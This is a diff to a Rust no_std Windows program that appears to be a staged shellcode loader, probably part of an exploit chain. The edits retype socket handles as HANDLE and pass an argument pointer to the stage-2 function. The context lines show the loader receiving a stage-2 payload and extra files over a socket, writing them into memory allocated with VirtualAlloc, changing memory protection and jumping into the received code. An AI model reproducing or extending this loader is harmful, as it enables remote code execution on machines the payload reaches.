@@ -7,6 +7,7 @@
 #![no_main]
 
 use windows_sys::Win32::Foundation::GENERIC_WRITE;
+use windows_sys::Win32::Foundation::HANDLE;
 
 use core::arch::asm;
 use core::ffi::c_int;
@@ -28,7 +29,7 @@ fn panic(_info: &PanicInfo) -> ! {
     loop {}
 }
 
-type Stage2Fn = fn() -> u64;
+type Stage2Fn = fn(*const ShellcodeArgs) -> u64;
 
 const STAGE3_ENV_FILENAME: &str = concat!(r#"%LOCALAPPDATA%\..\LocalState\"#, "\0");
 
@@ -146,7 +147,7 @@ pub extern "C" fn main() -> u64 {
 
         let mut stage2_len_bytes = [0u8; 4];
         if (ReadFile)(
-            socket as *mut _,
+            socket as HANDLE,
             stage2_len_bytes.as_mut_ptr() as *mut _,
             core::mem::size_of_val(&stage2_len_bytes) as u32,
             &mut bytes_read as *mut _,
@@ -160,7 +161,7 @@ pub extern "C" fn main() -> u64 {
 
         let stage2_mem = (VirtualAlloc)(core::ptr::null(), stage2_len, 0x00001000, 0x4);
         if (ReadFile)(
-            socket as *mut _,
+            socket as HANDLE,
             stage2_mem,
             stage2_len as u32,
             &mut bytes_read as *mut _,
@@ -184,7 +185,7 @@ pub extern "C" fn main() -> u64 {
             let mut file_info: MaybeUninit<DynamicFile> = MaybeUninit::uninit();
 
             if (ReadFile)(
-                socket as *mut _,
+                socket as HANDLE,
                 file_info.as_mut_ptr() as *mut _,
                 core::mem::size_of_val(&file_info) as u32,
                 &mut bytes_read as *mut _,
@@ -211,7 +212,7 @@ pub extern "C" fn main() -> u64 {
             let mut remaining = file_name_len as isize;
             while remaining > 0 {
                 if (ReadFile)(
-                    socket as *mut _,
+                    socket as HANDLE,
                     file_name
                         .as_mut_ptr()
                         .offset(file_name_len as isize - remaining) as *mut _,
@@ -232,7 +233,7 @@ pub extern "C" fn main() -> u64 {
             let mut remaining = file_len as isize;
             while remaining > 0 {
                 if (ReadFile)(
-                    socket as *mut _,
+                    socket as HANDLE,
                     file_mem.offset(file_len as isize - remaining) as *mut _,
                     remaining as u32,
                     &mut bytes_read as *mut _,
@@ -303,7 +304,7 @@ pub extern "C" fn main() -> u64 {
             &mut old_flags as *mut _,
         );
 
-        (CloseHandle)(socket as *mut _);
+        (CloseHandle)(socket as HANDLE);
 
         stage2_mem
     };
@@ -311,7 +312,7 @@ pub extern "C" fn main() -> u64 {
     debug_print!("Executing stage2");
 
     let stage2: Stage2Fn = unsafe { core::mem::transmute(stage2_data) };
-    stage2()
+    stage2(core::ptr::null())
 }
 
 // #[allow(unused_attributes)]
